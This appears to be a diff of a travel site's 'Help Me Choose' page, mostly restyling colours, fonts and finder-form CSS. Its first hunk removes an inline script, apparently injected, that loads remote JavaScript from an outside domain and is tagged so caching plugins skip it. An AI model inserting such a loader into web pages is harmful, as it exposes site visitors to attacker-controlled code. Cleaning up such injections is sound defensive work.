@@ -6,14 +6,7 @@
   <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.png" />
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png" />
 
-  <script nowprocket data-noptimize="1" data-cfasync="false" data-wpfc-render="false" seraph-accel-crit="1" data-no-defer="1">
-  (function () {
-      var script = document.createElement("script");
-      script.async = 1;
-      script.src = 'https://emrld.ltd/NTQ4MDY2.js?t=548066';
-      document.head.appendChild(script);
-  })();
-</script>
+  <script src="consent.js"></script>
 
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -33,7 +26,7 @@
 <meta name="twitter:description" content="Find your next destination: compare 123 cities by budget, travel time, season, visa and more.">
 <meta name="twitter:image" content="https://neverroamalone.com/images/og/og-default.jpg">
 <title>Help Me Choose — Never Roam Alone</title>
-<link rel="stylesheet" href="fonts/amatic-sc.css" />
+<link rel="stylesheet" href="fonts/amatic-sc.css" /><link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fraunces:ital,opsz,wght@0,9..144,500;0,9..144,600;0,9..144,700;0,9..144,900;1,9..144,600&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
 <link href="https://unpkg.com/maplibre-gl@4.7.1/dist/maplibre-gl.css" rel="stylesheet" />
 <script src="https://unpkg.com/maplibre-gl@4.7.1/dist/maplibre-gl.js"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flatpickr/4.6.13/flatpickr.min.css">
@@ -41,19 +34,19 @@
 <script src="https://cdnjs.cloudflare.com/ajax/libs/flatpickr/4.6.13/flatpickr.min.js"></script>
 <style>
   :root{
-    --ink:#1d2a32;--muted:#5b6b75;--sand:#f6f1e7;--green:#556B2F;--teal:#556B2F;
-    --coral:#C04020;--card:#fff;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1100px;
+    --ink:#2b2417;--muted:#82755b;--sand:#ece2cc;--green:#3f5138;--teal:#3f5138;
+    --coral:#a8482a;--card:#f6efdd;--shadow:0 10px 30px rgba(20,40,50,.12);--maxw:1100px;
   }
   *{box-sizing:border-box}
   body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
     color:var(--ink);background:var(--sand);line-height:1.65}
-  h1,h2,h3{font-family:Georgia,"Times New Roman",serif}
+  h1,h2,h3{font-family:'Fraunces','Fraunces',Georgia,serif}
   a{color:inherit;text-decoration:none}
 
-  header.nav{position:sticky;top:0;z-index:50;background:rgba(246,241,231,.92);
-    backdrop-filter:blur(8px);border-bottom:1px solid rgba(85,107,47,.15)}
+  header.nav{position:sticky;top:0;z-index:50;background:rgba(236,226,204,.92);
+    backdrop-filter:blur(8px);border-bottom:1px solid rgba(63,81,56,.15)}
   .nav-inner{max-width:var(--maxw);margin:0 auto;padding:12px 22px;display:flex;align-items:center;justify-content:space-between}
-  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:var(--coral)}
+  .brand{display:flex;align-items:center;gap:10px;font-family:'Amatic SC','Fraunces',Georgia,serif;font-weight:700;font-size:1.85rem;line-height:1;color:var(--coral)}
   .brand .logo{flex-shrink:0;display:block}
   .brand small{display:block;font-family:-apple-system,sans-serif;font-weight:500;font-size:.62rem;
     letter-spacing:.18em;text-transform:uppercase;color:var(--muted)}
@@ -78,22 +71,22 @@
 
   .tool-switch{max-width:var(--maxw);margin:26px auto 4px;padding:0 22px;display:flex;flex-wrap:nowrap;gap:12px;justify-content:center}
   .tool-switch .switch-btn{flex:1;min-width:0;justify-content:center}
-  .switch-btn{display:flex;align-items:center;gap:10px;background:#fff;border:2px solid rgba(85,107,47,.22);
+  .switch-btn{display:flex;align-items:center;gap:10px;background:#fff;border:2px solid rgba(63,81,56,.22);
     border-radius:12px;padding:12px 16px;cursor:pointer;font-weight:600;font-size:.82rem;text-transform:uppercase;letter-spacing:.08em;color:var(--ink);transition:.18s;user-select:none}
   .switch-btn:hover{border-color:var(--green)}
   .switch-btn input{position:absolute;opacity:0;width:0;height:0}
   .switch-btn .box{width:18px;height:18px;border:2px solid var(--green);border-radius:3px;flex-shrink:0;position:relative;transition:.18s}
-  .switch-btn.active{border-color:var(--green);background:rgba(85,107,47,.07)}
+  .switch-btn.active{border-color:var(--green);background:rgba(63,81,56,.07)}
   .switch-btn.active .box{background:var(--green)}
   .switch-btn.active .box::after{content:"";position:absolute;left:4px;top:1px;width:5px;height:9px;
     border:solid #fff;border-width:0 2px 2px 0;transform:rotate(45deg)}
-  label.field{display:block;font-family:Georgia,serif;font-size:1.15rem;margin-bottom:10px}
+  label.field{display:block;font-family:'Fraunces',Georgia,serif;font-size:1.15rem;margin-bottom:10px}
   .field-note{color:var(--muted);font-size:.95rem;margin:-4px 0 16px}
   .label-hint{display:inline-block;font-family:-apple-system,sans-serif;font-size:.82rem;font-weight:400;color:var(--muted)}
   .field-grid{display:grid;grid-template-columns:1fr 1fr;gap:18px 20px;margin-top:4px}
   .field-full{grid-column:1 / -1}
   @media(max-width:600px){.field-grid{grid-template-columns:1fr}}
-  .when-switch{position:relative;display:flex;gap:0;margin:2px 0 14px;background:var(--sand);border:2px solid rgba(85,107,47,.18);border-radius:12px;padding:3px}
+  .when-switch{position:relative;display:flex;gap:0;margin:2px 0 14px;background:var(--sand);border:2px solid rgba(63,81,56,.18);border-radius:12px;padding:3px}
   .when-switch::before{content:"";position:absolute;top:3px;bottom:3px;left:3px;width:calc(50% - 3px);background:var(--green);border-radius:9px;transition:transform .22s ease;z-index:0}
   .when-switch.right::before{transform:translateX(100%)}
   .when-switch .mini-radio{flex:1;position:relative;z-index:1;display:flex;align-items:center;justify-content:center;gap:8px;background:transparent;border:none;border-radius:9px;padding:9px 12px;cursor:pointer;font-weight:600;color:var(--ink);font-size:.92rem;transition:color .22s}
@@ -112,12 +105,12 @@
   @media(max-width:600px){.results-bar{padding:22px 22px 0}.results-bar .select-wrap{min-width:0;flex:1}}
   .autocomplete{position:relative}
   .origin-input,.num-input{width:100%;font-size:1.05rem;font-family:inherit;color:var(--ink);background:var(--sand);
-    border:2px solid rgba(85,107,47,.25);border-radius:12px;padding:15px 16px;transition:border-color .2s}
+    border:2px solid rgba(63,81,56,.25);border-radius:12px;padding:15px 16px;transition:border-color .2s}
   .origin-input:focus,.num-input:focus{outline:none;border-color:var(--green)}
   .ac-list{list-style:none;margin:6px 0 0;padding:6px;position:absolute;z-index:30;left:0;right:0;background:#fff;
-    border:1px solid rgba(85,107,47,.2);border-radius:12px;box-shadow:var(--shadow);max-height:290px;overflow:auto}
+    border:1px solid rgba(63,81,56,.2);border-radius:12px;box-shadow:var(--shadow);max-height:290px;overflow:auto}
   .ac-list li{padding:9px 12px;border-radius:8px;cursor:pointer;display:flex;justify-content:space-between;gap:12px;align-items:center}
-  .ac-list li:hover,.ac-list li.active{background:rgba(85,107,47,.08)}
+  .ac-list li:hover,.ac-list li.active{background:rgba(63,81,56,.08)}
   .ac-city{font-weight:600;font-size:.95rem}
   .ac-name{display:block;color:var(--muted);font-size:.78rem;font-weight:400}
   .ac-code{font-weight:800;color:var(--green);font-size:.9rem;flex-shrink:0;letter-spacing:.04em}
@@ -129,7 +122,7 @@
   .select-wrap{position:relative}
   .select-wrap select{
     width:100%;appearance:none;-webkit-appearance:none;font-size:1.05rem;font-family:inherit;color:var(--ink);
-    background:var(--sand);border:2px solid rgba(85,107,47,.25);border-radius:12px;padding:15px 46px 15px 16px;cursor:pointer;
+    background:var(--sand);border:2px solid rgba(63,81,56,.25);border-radius:12px;padding:15px 46px 15px 16px;cursor:pointer;
     transition:border-color .2s}
   .select-wrap select:focus{outline:none;border-color:var(--green)}
   .select-wrap::after{content:"";position:absolute;right:18px;top:50%;width:10px;height:10px;
@@ -157,7 +150,7 @@
     display:flex;flex-direction:column;transition:transform .25s, box-shadow .25s}
   .card:hover{transform:translateY(-6px);box-shadow:0 18px 40px rgba(20,40,50,.18)}
   .card .photo{height:170px;background-size:cover;background-position:center;position:relative;background-color:#2c3e36}
-  .card .visit{position:absolute;top:12px;right:12px;background:rgba(85,107,47,.92);color:#fff;
+  .card .visit{position:absolute;top:12px;right:12px;background:rgba(63,81,56,.92);color:#fff;
     font-size:.72rem;font-weight:700;padding:5px 10px;border-radius:20px}
   .card .rank-chip{position:absolute;top:12px;left:12px;background:var(--coral);color:#fff;
     font-size:.82rem;font-weight:800;padding:5px 11px;border-radius:20px;box-shadow:0 2px 8px rgba(0,0,0,.25)}
@@ -165,9 +158,9 @@
   .card .country{color:var(--teal);font-size:.72rem;font-weight:700;text-transform:uppercase;letter-spacing:.1em}
   .season-pill{display:inline-block;margin-left:8px;padding:2px 9px;border-radius:12px;font-size:.66rem;
     font-weight:700;text-transform:none;letter-spacing:0;vertical-align:middle;line-height:1.5}
-  .season-pill.good{background:rgba(85,107,47,.12);color:#556B2F}
+  .season-pill.good{background:rgba(63,81,56,.12);color:#3f5138}
   .season-pill.warn{background:rgba(207,138,44,.16);color:#a3620e}
-  .season-pill.peak{background:rgba(192,64,32,.14);color:#C04020}
+  .season-pill.peak{background:rgba(168,72,42,.14);color:#a8482a}
   .card h3{font-size:1.2rem;margin:6px 0 8px}
   .card p{color:var(--muted);font-size:.92rem;margin:0 0 14px}
   .card .go{align-self:flex-start;background:var(--green);color:#fff;font-weight:700;font-size:.82rem;
@@ -182,26 +175,26 @@
   .fav-wrap{display:flex;flex-direction:column;align-items:flex-end;gap:2px;flex:1 1 50%}
   .fav-label{font-size:.6rem;font-weight:700;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
   .fav-heart{
-    border:2px solid rgba(192,64,32,.35);background:none;color:var(--coral);
+    border:2px solid rgba(168,72,42,.35);background:none;color:var(--coral);
     width:32px;height:32px;border-radius:50%;font-size:1rem;line-height:1;cursor:pointer;
     display:flex;align-items:center;justify-content:center;transition:.15s;flex-shrink:0;
   }
-  .fav-heart:hover{background:rgba(192,64,32,.1)}
+  .fav-heart:hover{background:rgba(168,72,42,.1)}
   .fav-heart.active{background:var(--coral);color:#fff;border-color:var(--coral)}
   .fav-heart[disabled]{opacity:.6;cursor:default}
   .bucket-visited-btn{
-    border:2px solid rgba(85,107,47,.35);background:none;color:var(--green);font-weight:700;font-size:.78rem;
+    border:2px solid rgba(63,81,56,.35);background:none;color:var(--green);font-weight:700;font-size:.78rem;
     font-family:inherit;padding:8px 13px;border-radius:18px;cursor:pointer;transition:.2s;
   }
-  .bucket-visited-btn:hover{background:rgba(85,107,47,.08)}
+  .bucket-visited-btn:hover{background:rgba(63,81,56,.08)}
   .bucket-visited-btn.active{background:var(--green);color:#fff;border-color:var(--green)}
   .bucket-visited-btn[disabled]{opacity:.6;cursor:default}
   .flights-link{display:block;width:100%;box-sizing:border-box;text-align:center;font-size:.8rem;font-weight:700;color:#fff;
-    background:rgba(192,64,32,.5);padding:8px 16px;border-radius:22px;transition:background .2s}
+    background:rgba(168,72,42,.5);padding:8px 16px;border-radius:22px;transition:background .2s}
   .flights-link:hover{background:var(--green);text-decoration:none}
 
   /* "Why this matched" block on finder cards */
-  .why{margin:0 0 14px;padding:10px 12px;background:rgba(85,107,47,.05);border-radius:10px;font-size:.8rem;color:var(--muted)}
+  .why{margin:0 0 14px;padding:10px 12px;background:rgba(63,81,56,.05);border-radius:10px;font-size:.8rem;color:var(--muted)}
   .why .w{display:flex;gap:7px;padding:2px 0;align-items:baseline}
   .why .w.cost-highlight{background:#fff4c2;padding:6px 8px;border-radius:8px;margin:2px 0}
   .why .w .tick{color:var(--green);font-weight:800;flex-shrink:0}
@@ -212,10 +205,10 @@
   .cmp-toggle{background:none;border:none;padding:0 0 10px;margin:-4px 0 0;cursor:pointer;font-family:inherit;
     font-size:.78rem;font-weight:700;color:var(--teal);text-align:left}
   .cmp-toggle:hover{text-decoration:underline}
-  .cmp-modes{margin:0 0 14px;border:1px solid rgba(85,107,47,.15);border-radius:10px;overflow:hidden}
+  .cmp-modes{margin:0 0 14px;border:1px solid rgba(63,81,56,.15);border-radius:10px;overflow:hidden}
   .cmp-row{display:flex;align-items:baseline;gap:8px;padding:7px 10px;font-size:.78rem;color:var(--muted);flex-wrap:wrap}
-  .cmp-row + .cmp-row{border-top:1px solid rgba(85,107,47,.1)}
-  .cmp-row.picked{background:rgba(85,107,47,.07)}
+  .cmp-row + .cmp-row{border-top:1px solid rgba(63,81,56,.1)}
+  .cmp-row.picked{background:rgba(63,81,56,.07)}
   .cmp-row .cm-mode{font-weight:700;color:var(--ink);flex:0 0 84px}
   .cmp-row.picked .cm-mode{color:var(--green)}
   .cmp-row .cm-cost{margin-left:auto;font-weight:600;white-space:nowrap}
@@ -223,14 +216,14 @@
   .est-tag{font-style:normal;background:#cf8a2c;color:#fff;font-size:.62rem;font-weight:700;padding:1px 6px;border-radius:10px}
 
   .nights-inline{width:56px;font:inherit;font-weight:700;color:var(--green);text-align:center;background:#fff;
-    border:1.5px solid rgba(85,107,47,.4);border-radius:8px;padding:2px 2px 2px 8px;cursor:pointer}
+    border:1.5px solid rgba(63,81,56,.4);border-radius:8px;padding:2px 2px 2px 8px;cursor:pointer}
   .nights-inline:focus{outline:none;border-color:var(--green)}
   .empty{text-align:center;color:var(--muted);padding:30px 22px 10px;font-size:1.02rem}
 
   .visa{max-width:560px;margin:24px auto 0;padding:10px 22px 0}
   .visa-panel{background:var(--card);border-radius:18px;box-shadow:var(--shadow);padding:30px 28px;text-align:center}
   .visa-title{font-size:1.7rem;margin:0 0 8px;color:var(--green)}
-  .visa-sub{font-family:Georgia,serif;font-weight:400;font-size:1.12rem;color:var(--ink);margin:0 0 18px}
+  .visa-sub{font-family:'Fraunces',Georgia,serif;font-weight:400;font-size:1.12rem;color:var(--ink);margin:0 0 18px}
   .visa .select-wrap{max-width:400px;margin:0 auto}
   .visa-status{margin:16px 0 0;font-size:.85rem;color:var(--muted)}
   .visa-status a{color:var(--teal);font-weight:600}
@@ -244,7 +237,7 @@
   .visa-filter-hint{font-size:.78rem;color:var(--muted);text-align:center;margin:0 auto 14px}
   .visa-filter-hint button{background:none;border:none;color:var(--teal);font-weight:700;cursor:pointer;font-size:.78rem;padding:0;text-decoration:underline}
   .visa-filter{display:block;width:100%;max-width:380px;margin:0 auto 22px;font-size:1rem;font-family:inherit;
-    padding:12px 16px;border:2px solid rgba(85,107,47,.25);border-radius:12px;background:#fff}
+    padding:12px 16px;border:2px solid rgba(63,81,56,.25);border-radius:12px;background:#fff}
   .visa-filter:focus{outline:none;border-color:var(--green)}
   .visa-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(252px,1fr));gap:12px}
   .visa-row{display:flex;align-items:center;justify-content:space-between;gap:10px;background:#fff;
@@ -256,17 +249,17 @@
   .verify:hover{text-decoration:underline}
   .visa-disclaimer{font-size:.78rem;color:var(--muted);margin:24px auto 0;text-align:center;max-width:700px}
   .visa-disclaimer a{color:var(--teal);font-weight:600}
-  .b-free{background:#1f8f4e}.b-voa{background:#556B2F}.b-eta{background:#3b6fb0}
-  .b-evisa{background:#cf8a2c}.b-req{background:#b34a3a}.b-no{background:#5b6b75}
+  .b-free{background:#1f8f4e}.b-voa{background:#3f5138}.b-eta{background:#3b6fb0}
+  .b-evisa{background:#cf8a2c}.b-req{background:#b34a3a}.b-no{background:#82755b}
 
   /* Bucket List */
   .bl-chips{display:flex;flex-wrap:wrap;gap:10px;justify-content:center;max-width:var(--maxw);margin:26px auto 0;padding:0 22px}
-  .bl-chip{background:#fff;border:2px solid rgba(85,107,47,.22);border-radius:22px;padding:8px 16px;cursor:pointer;
+  .bl-chip{background:#fff;border:2px solid rgba(63,81,56,.22);border-radius:22px;padding:8px 16px;cursor:pointer;
     font-weight:700;font-size:.85rem;color:var(--muted);transition:.15s}
   .bl-chip:hover{border-color:var(--green);color:var(--green)}
   .bl-chip.active{background:var(--green);border-color:var(--green);color:#fff}
   .bl-search{display:block;width:100%;max-width:380px;margin:18px auto 0;font-size:1rem;font-family:inherit;
-    padding:12px 16px;border:2px solid rgba(85,107,47,.25);border-radius:12px;background:#fff}
+    padding:12px 16px;border:2px solid rgba(63,81,56,.25);border-radius:12px;background:#fff}
   .bl-search:focus{outline:none;border-color:var(--green)}
   .bl-meta{margin:4px 0 12px;font-size:.78rem;color:var(--muted)}
   .bl-meta .src{color:var(--teal);font-weight:600}
@@ -291,7 +284,7 @@
   .bl-modal .bm-close:hover{color:var(--ink)}
   .bl-modal .bm-kicker{color:var(--teal);font-weight:700;text-transform:uppercase;letter-spacing:.12em;font-size:.7rem}
   .bl-modal h3{margin:4px 0 16px;font-size:1.35rem;color:var(--green);padding-right:24px}
-  .bm-row{display:flex;gap:11px;align-items:flex-start;padding:11px 0;border-top:1px solid rgba(85,107,47,.12)}
+  .bm-row{display:flex;gap:11px;align-items:flex-start;padding:11px 0;border-top:1px solid rgba(63,81,56,.12)}
   .bm-row .bm-ico{font-size:1.15rem;flex-shrink:0;line-height:1.3}
   .bm-row .bm-lab{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.08em;color:var(--muted)}
   .bm-row .bm-val{font-size:.95rem;color:var(--ink);margin-top:1px}
@@ -316,9 +309,171 @@
     .tool-switch{flex-direction:column;align-items:stretch}
     .tool-switch .switch-btn{flex:none;justify-content:flex-start}
   }
+
+  /* ================= EXPLORER THEME (overrides) ================= */
+  body{font-family:'Work Sans',-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif!important;
+    background-color:var(--sand);background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='60' height='60'%3E%3Cg fill='none' stroke='%232b2417' stroke-opacity='0.05' stroke-width='1'%3E%3Cpath d='M0 0H60M0 0V60'/%3E%3C/g%3E%3C/svg%3E"),url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='500' height='500' viewBox='0 0 500 500'%3E%3Cg fill='none' stroke='%233f5138' stroke-opacity='0.06' stroke-width='1.4'%3E%3Cpath d='M70 250c0-90 70-155 165-155s195 60 195 155-95 165-195 165S70 340 70 250z'/%3E%3Cpath d='M120 250c0-62 50-108 115-108s140 44 140 108-70 122-140 122-115-60-115-122z'/%3E%3Cpath d='M170 250c0-36 28-62 65-62s85 26 85 62-42 72-85 72-65-36-65-72z'/%3E%3C/g%3E%3C/svg%3E");background-position:0 0,center}
+  h1,h2,h3{font-family:'Fraunces',Georgia,serif!important;letter-spacing:-.01em}
+  header.nav{border-bottom:1px solid var(--ink)}
+  .brand small{font-family:'Work Sans',monospace;letter-spacing:.22em}
+  nav.links a:hover{color:var(--coral);border-color:#b0802f}
+  .fact,.tile,.tcard,.dtcard,.stay-card,.hood,.card{border:1px solid var(--ink);border-radius:3px}
+  .form-card,.visa-panel,.gate,.legal,.toc,.city-card,.cmp-card,.qadmin,.ns-card,.travel-map,.cover-strip,.suggest,.empty,.side-card,.roamers-card,.cal-wrap,.qcard{border-radius:3px}
+  .form-card,.visa-panel,.gate,.legal,.toc,.city-card,.cmp-card,.qadmin,.ns-card,.side-card{border:1px solid var(--ink)}
+  .tile .photo,.hood-hero,.g-cell,.cover{filter:sepia(.16) saturate(.96)}
+  footer{background:#2c3a27;border-top:5px solid #b0802f}
+  footer .brand{color:#c99a45}
+  /* ---- full-design: finder page chrome ---- */
+  .intro .cx{width:24px;height:24px;color:#b0802f;display:block;margin:0 auto 8px}
+  .intro h1 em{font-style:italic;color:var(--coral)}
+  .tool-section[data-tool="finder"] .panel{position:relative;border:1px solid var(--ink);border-radius:3px}
+  .tool-section[data-tool="finder"] .panel::after{content:"";position:absolute;left:6px;right:6px;top:6px;bottom:6px;border:1px solid var(--line-soft);pointer-events:none}
+  .tool-section[data-tool="finder"] .panel>*{position:relative;z-index:1}
+  .panel .corner{display:inline-block;font-family:'Work Sans',monospace;font-size:.6rem;letter-spacing:.16em;text-transform:uppercase;color:#fff;background:var(--coral);padding:5px 12px;margin:0 0 16px}
+  .results-plate{display:flex;align-items:center;gap:10px;justify-content:center;margin:0 0 6px}
+  .results-plate .cx{width:20px;height:20px;color:#b0802f;flex:none}
+  .results-plate span{font-family:'Work Sans',monospace;font-size:.68rem;letter-spacing:.16em;text-transform:uppercase;color:var(--muted)}
+  .results-plate b{color:var(--coral)}
+  #finderResults h2 em,#bucketResults h2 em{font-style:italic;color:var(--coral)}
+
+
+  /* ---- full-design v2: finder identity (parchment head, tab bar, rank plate) ---- */
+  .intro.hero-banner{background:transparent!important;color:var(--ink)!important;width:auto!important;max-width:820px;margin:0 auto;padding:50px 22px 0;border:none!important}
+  .intro.hero-banner .cx{color:#b0802f}
+  .intro.hero-banner .kicker{color:var(--teal)!important;opacity:1;font-family:'Work Sans',monospace;letter-spacing:.24em;text-transform:uppercase}
+  .intro.hero-banner h1{color:var(--ink)!important}
+  .intro.hero-banner h1 em{color:var(--coral)}
+  .intro.hero-banner p.sub{color:var(--muted)!important;max-width:600px;margin:14px auto 0;font-size:1rem}
+
+  .tool-switch{gap:8px;margin:34px auto 0;border-bottom:1px solid var(--ink);flex-wrap:wrap;padding-bottom:0}
+  .tool-switch .switch-btn{flex:none;background:var(--card);border:1px solid var(--ink);border-bottom:none;border-radius:0;
+    padding:13px 22px;font-family:'Work Sans',monospace;font-weight:600;text-transform:uppercase;letter-spacing:.1em;
+    font-size:.74rem;color:var(--muted);position:relative;top:1px;gap:8px}
+  .tool-switch .switch-btn .box{display:none}
+  .tool-switch .switch-btn:hover{border-color:var(--ink);color:var(--ink)}
+  .tool-switch .switch-btn.active{background:var(--coral);border-color:var(--coral);color:#fff}
+
+  .card .rank-chip{top:0;left:0;border-radius:0!important;box-shadow:none!important;
+    font-family:'Work Sans',monospace;font-size:.64rem;font-weight:600;letter-spacing:.08em;padding:7px 11px}
+
+  /* ---- full-design v3: card country script + field-dispatch signup ---- */
+  .card .body .country{font-family:'Amatic SC',cursive;color:var(--coral);font-size:1.4rem;font-weight:700;text-transform:none;letter-spacing:0;line-height:1}
+  .card .body .country .season-pill{font-family:'Work Sans',sans-serif;font-size:.66rem}
+
+  .nra-ml{position:relative!important;overflow:hidden!important;background-color:var(--card)!important;border:1px solid var(--ink)!important;border-radius:0!important;
+    background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='760' height='230' viewBox='0 0 760 230'%3E%3Cg fill='none'%3E%3Cpath d='M20 185 C 140 120, 230 205, 340 150 S 540 60, 660 95' stroke='%23a8482a' stroke-width='2.5' stroke-dasharray='7 8' stroke-linecap='round' opacity='.7'/%3E%3Ccircle cx='20' cy='185' r='6' fill='%233f5138'/%3E%3Ccircle cx='340' cy='150' r='4.5' fill='%23b0802f'/%3E%3Ccircle cx='500' cy='96' r='4.5' fill='%23b0802f'/%3E%3Cpath d='M648 83 L672 107 M672 83 L648 107' stroke='%23a8482a' stroke-width='5' stroke-linecap='round'/%3E%3Ccircle cx='660' cy='95' r='20' stroke='%23a8482a' stroke-width='1.5' opacity='.5' stroke-dasharray='3 5'/%3E%3C/g%3E%3C/svg%3E")!important;background-repeat:no-repeat!important;background-position:right -20px bottom -14px!important}
+  .nra-ml::after{content:"";position:absolute;left:6px;right:6px;top:6px;bottom:6px;border:1px solid rgba(43,36,23,.12);pointer-events:none}
+  .nra-ml>*{position:relative;z-index:1}
+  .nra-ml .ml-kicker{font-family:'Work Sans',monospace!important;color:var(--teal)!important;letter-spacing:.2em!important}
+  .nra-ml h2{font-family:'Fraunces',serif!important;font-weight:700!important;color:var(--ink)!important}
+  .nra-ml input[type=email]{border-radius:0!important;border:1px solid var(--ink)!important;background:var(--sand)!important}
+  .nra-ml button{border-radius:0!important;background:var(--coral)!important;font-family:'Work Sans',monospace!important;text-transform:uppercase!important;letter-spacing:.08em!important}
+  .nra-ml button:hover{background:#8a3a20!important}
+
+  /* ---- full-design v4: finder form as dossier (grid + seg + chips) ---- */
+  .tool-section[data-tool="finder"] .field-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px 22px;align-items:start}
+  .tool-section[data-tool="finder"] .field-full{grid-column:1/-1}
+  @media(max-width:820px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:repeat(2,1fr)}.tool-section[data-tool="finder"] [style*="grid-column:span 2"]{grid-column:1/-1}}
+  @media(max-width:560px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:1fr}}
+  .panel label.field{font-family:'Work Sans',monospace;font-size:.62rem;letter-spacing:.14em;text-transform:uppercase;color:var(--teal);font-weight:600}
+  .panel .select-wrap select,.panel input.origin-input,.panel input.num-input{background:var(--sand);border:1px solid var(--ink);border-radius:0}
+  .nra-seg{display:flex;border:1px solid var(--ink);overflow:hidden;flex-wrap:wrap}
+  .nra-seg span{flex:1;min-width:62px;text-align:center;padding:11px 6px;font-size:.76rem;font-weight:600;color:var(--muted);background:var(--sand);cursor:pointer;border-right:1px solid var(--ink);transition:.15s}
+  .nra-seg span:last-child{border-right:none}
+  .nra-seg span:hover{color:var(--ink)}
+  .nra-seg span.on{background:var(--coral);color:#fff}
+  .nra-chips{display:flex;gap:8px;flex-wrap:wrap}
+  .nra-chips .lchip{background:var(--sand);border:1px solid var(--ink);border-radius:0;padding:8px 15px;font-size:.78rem;color:var(--muted);cursor:pointer;transition:.15s}
+  .nra-chips .lchip:hover{color:var(--ink);border-color:var(--teal)}
+  .nra-chips .lchip.on{background:rgba(63,81,56,.14);border-color:var(--teal);color:var(--ink)}
+
+  /* ---- full-design v5: unify ALL finder fields to one spec (incl. date pickers) ---- */
+  .tool-section[data-tool="finder"] .panel input:not([type=checkbox]):not([type=radio]),
+  .tool-section[data-tool="finder"] .panel .select-wrap select,
+  .tool-section[data-tool="finder"] .panel input.flatpickr-input,
+  .tool-section[data-tool="finder"] .panel .flatpickr-input.altInput{
+    width:100%;
+    background:var(--sand);
+    border:1px solid var(--ink);
+    color:var(--ink);
+    padding:12px 14px;
+    font-family:'Work Sans',sans-serif;
+    font-size:.9rem;
+    border-radius:0;
+    box-shadow:none;
+  }
+  .tool-section[data-tool="finder"] .panel input:not([type=checkbox]):not([type=radio]):focus,
+  .tool-section[data-tool="finder"] .panel .select-wrap select:focus,
+  .tool-section[data-tool="finder"] .panel .flatpickr-input.altInput:focus{
+    outline:none;border-color:var(--coral);
+  }
+  /* native date icon tinted to match the palette (fallback when flatpickr is off) */
+  .tool-section[data-tool="finder"] .panel input[type=date]::-webkit-calendar-picker-indicator{filter:sepia(1) saturate(4) hue-rotate(-15deg) brightness(.7)}
+
+  /* ---- full-design v6: content-fit field widths (whole form, wraps on mobile) ---- */
+  .tool-section[data-tool="finder"] .field-grid{align-items:start}
+  .tool-section[data-tool="finder"] .autocomplete{max-width:22rem}            /* Traveling from */
+  .tool-section[data-tool="finder"] .sw-narrow{max-width:15rem}               /* Where / Passport */
+  .tool-section[data-tool="finder"] #totalBudget{max-width:12rem}             /* Total budget */
+  .tool-section[data-tool="finder"] #nights{max-width:10rem}                  /* Trip length */
+  .tool-section[data-tool="finder"] #departDate,
+  .tool-section[data-tool="finder"] #returnDate{max-width:13rem}              /* Dates */
+  /* keep them from stretching even when their grid cell is wider */
+  .tool-section[data-tool="finder"] .field-grid > div > .autocomplete,
+  .tool-section[data-tool="finder"] .field-grid > div > .select-wrap{width:100%}
+
+  /* ---- full-design v7: force responsive column count (last-word cascade) ---- */
+  @media(max-width:620px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:1fr!important}}
+  @media(min-width:621px) and (max-width:900px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:1fr 1fr!important}}
+  @media(min-width:901px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:repeat(3,1fr)!important}}
+
+  /* ---- full-design v8: span-2 as class + responsive (fixes mobile implicit column) ---- */
+  .tool-section[data-tool="finder"] .span2{grid-column:span 2}
+  @media(max-width:900px){.tool-section[data-tool="finder"] .span2{grid-column:1/-1}}
+
+  /* ---- MATCH MOCKUP: exact 3-col grid, inputs fill their columns ---- */
+  .tool-section[data-tool="finder"] .field-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:22px 22px;align-items:start}
+  .tool-section[data-tool="finder"] .fld-love{grid-column:span 2}
+  /* inputs fill the column (remove the earlier per-field width caps) */
+  .tool-section[data-tool="finder"] .autocomplete,
+  .tool-section[data-tool="finder"] .sw-narrow,
+  .tool-section[data-tool="finder"] .select-wrap,
+  .tool-section[data-tool="finder"] #totalBudget,
+  .tool-section[data-tool="finder"] #nights,
+  .tool-section[data-tool="finder"] #departDate,
+  .tool-section[data-tool="finder"] #returnDate,
+  .tool-section[data-tool="finder"] .origin-input,
+  .tool-section[data-tool="finder"] .num-input{max-width:none!important;width:100%}
+  @media(max-width:900px){
+    .tool-section[data-tool="finder"] .field-grid{grid-template-columns:repeat(2,1fr)!important}
+    .tool-section[data-tool="finder"] .fld-love{grid-column:1/-1}
+  }
+  @media(max-width:620px){
+    .tool-section[data-tool="finder"] .field-grid{grid-template-columns:1fr!important}
+    .tool-section[data-tool="finder"] .fld-love{grid-column:auto}
+  }
+
+  /* ---- MATCH MOCKUP (authoritative): equal columns, controls fit within ---- */
+  @media(min-width:901px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:repeat(3,minmax(0,1fr))!important}}
+  @media(min-width:621px) and (max-width:900px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:repeat(2,minmax(0,1fr))!important}}
+  @media(max-width:620px){.tool-section[data-tool="finder"] .field-grid{grid-template-columns:1fr!important}}
+  .tool-section[data-tool="finder"] .nra-seg span{min-width:0;flex:1 1 auto;font-size:.72rem;padding:11px 4px}
